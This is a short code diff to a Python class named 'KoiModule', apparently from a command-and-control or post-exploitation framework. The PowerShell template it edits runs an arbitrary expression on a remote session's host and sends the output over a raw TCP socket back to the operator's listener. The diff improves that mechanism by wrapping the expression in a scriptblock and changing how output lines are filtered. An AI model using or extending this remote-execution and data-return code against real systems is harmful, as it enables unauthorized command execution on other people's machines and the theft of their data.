@@ -298,7 +298,7 @@ class KoiModule(ABC):
                 raw, buf = buf.split(b"\n", 1)
                 text = raw.decode(enc, errors="replace").strip("\r\n ")
                 text = _PS_PROMPT.sub("", text).strip()
-                if not text or "Write-Host" in text:
+                if not text:
                     continue
                 if marker in text:
                     if text == marker:
@@ -324,7 +324,7 @@ class KoiModule(ABC):
         local_ip = self._get_local_ip()
         with TCPReceiveServer(timeout=timeout, expected_ip=self.session.addr[0]) as srv:
             ps_cmd = (
-                f"$_r=({ps_expr})|Out-String;"
+                f"$_r=(& {{ {ps_expr} }})|Out-String;"
                 f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{srv.port});"
                 f"$_s=$_c.GetStream();"
                 f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
